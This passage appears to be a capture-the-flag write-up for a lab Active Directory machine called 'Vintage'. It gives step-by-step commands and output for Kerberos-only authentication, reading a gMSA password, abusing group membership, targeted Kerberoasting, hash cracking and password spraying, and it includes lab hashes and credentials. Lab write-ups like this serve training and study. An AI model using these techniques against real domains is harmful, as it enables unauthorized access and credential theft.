---
title: vintage
published: 2025-03-08
description: ''
image: ''
tags: []
category: ''
draft: true 
lang: ''
---

**Difficulty** : Hard

# enumeration
```bash
sudo nmap -sC -sV  -oA vintage 10.10.11.45

Nmap scan report for 10.10.11.45
Host is up (0.098s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-25 19:14:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-12-25T19:15:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 25 20:15:51 2024 -- 1 IP address (1 host up) scanned in 69.80 seconds

```

not so much ,just a typical AD setup

next, we use the given creds to enumerate the AD environment  

## AD enumeration
first lets test those creds
```bash
netexec smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123'

SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

we see the error `STATUS_NOT_SUPPORTED` which means the NTLM authentication is disabled, so we have to use kerberoas

```bash
netexec smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k

SMB         vintage.htb     445    vintage          [*]  x64 (name:vintage) (domain:htb) (signing:True) (SMBv1:False)
SMB         vintage.htb     445    vintage          [-] htb\P.Rosa:Rosaisbest123 [Errno Connection error (HTB:88)] [Errno -2] Name or service not known
```

smb does not seems to like the kerberoas authentication, lets try with ldap

```bash
netexec ldap vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k

LDAP        vintage.htb     389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        vintage.htb     389    dc01.vintage.htb [+] vintage.htb\P.Rosa:Rosaisbest123
```

nice this one worked

### BloodHound

taking into consideration NTLM auth is disabled
```bash
bloodhound-python --auth-method auto -u 'P.Rosa' -p 'Rosaisbest123' -d vintage.htb -c all -k -dc dc01.vintage.htb
``` 

zip all the json into a zip and open it in bloodhound-gui

our current user P.Rosa does not seems to have interesting rights
![](src/assets/vintage/Vintage_image_1.png)

so lets look for another starting point

![](src/assets/vintage/Vintage_image_2.png)

we see that both users `L.BIANCHI` and `C.NERI` can use winrm porotocl to connect to the DC
![](src/assets/vintage/Vintage_image_3.png)

`L.BIANCHI_ADM` is an admin account so probably we should take `L.BIANCHI` first then escalate to admin `L.BIANCHI_ADM` or take `C.NERI` first , just maybe

looking around we cant find anyway to take `C.NERI` or `L.BIANCHI

in the bloodhound-python  output before we noticed a computer named `FS01` lets look for it
![](src/assets/vintage/Vintage_image_4.png)

![](src/assets/vintage/Vintage_image_5.png)

![](src/assets/vintage/Vintage_image_6.png)

we can see that the `FS01` computer can read `GMSA01` password

#### now lets try to to get the GMSA01 password
since we dont have any creds lets try the most obvious one FS01

```bash
getTGT.py  -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01


Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in FS01$.ccache
```


using bloodyAD to read the `msDS-ManagedPassword`

```bash
KRB5CCNAME=FS01\$.ccache bloodyAD --host dc01.vintage.htb -d "vintage.htb" --dc-ip 10.10.11.45 -k get object "GMSA01$" --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
```

#### From GMSA01 user
enumerating GMSA01 rights
![](src/assets/vintage/Vintage_image_7.png)

GMSA01 have rights to add users to the `SERVICEMANAGERS` group

`SERVICEMANAGERS` have genericALL rights on the service accounts

![](src/assets/vintage/Vintage_image_8.png)

so we can either do Kerberoas attack or change their passwords

#### taking the services accouts
##### first lets add P.Rosa to the `SERVICEMANAGERS`

```bash
KRB5CCNAME=gmsa01$.ccache bloodyAD -d vintage.htb -k --host dc01.vintage.htb add groupMember SERVICEMANAGERS P.Rosa

[+] P.Rosa added to SERVICEMANAGERS
```

now since `P.Rosa` is a member of this group she can do targetedkerberoas or change passwords, but looking at the users who can either use winRM or mssql we see that none of those service users have those rights, so changing their passwords is useless also those users have no OUTBOUND rights

so the plan here it to do targetedKerberoasting and get some passwords to do password spraying with them and see if we have password reuse



```bash
RB5CCNAME=P.Rosa.ccache python targetedKerberoast/targetedKerberoast.py -v -d 'vintage.htb' --dc-host dc01.vintage.htb -k  --no-pass

```

we get Tickets of all three users trying to crack them with john gives us only 1 valid password for svc_sql account

```bash
john --wordlist=rockyou.txt svc_sql_ticket
```

found password: `Zer0the0ne`

now lets do password spraying hunting for reused passwords


```bash
kerbrute passwordspray -d vintage.htb --dc 10.10.11.45 usernames.txt Zer0the0ne -v


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/27/24 - Ronnie Flathers @ropnop

2024/12/27 11:54:55 >  Using KDC(s):
2024/12/27 11:54:55 >  	10.10.11.45:88

2024/12/27 11:54:55 >  [!] Guest@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/27 11:54:55 >  [!] krbtgt@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/27 11:54:55 >  [!] G.Viola@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] DC01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] gMSA01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] Administrator@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] R.Verdi@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] FS01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] M.Rossi@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] L.Bianchi@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] svc_sql@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/27 11:54:55 >  [!] P.Rosa@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] svc_ldap@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] svc_ark@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] L.Bianchi_adm@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [!] C.Neri_adm@vintage.htb:Zer0the0ne - Invalid password
2024/12/27 11:54:55 >  [+] VALID LOGIN:	 C.Neri@vintage.htb:Zer0the0ne

```

we find this creds: `C.Neri@vintage.htb:Zer0the0ne`
and since `C.Neri` have winRM rights lets try to connect to the DC with C.Neri

since we are working with kerberoas authentication and not NTLM, we need to generate a TGT

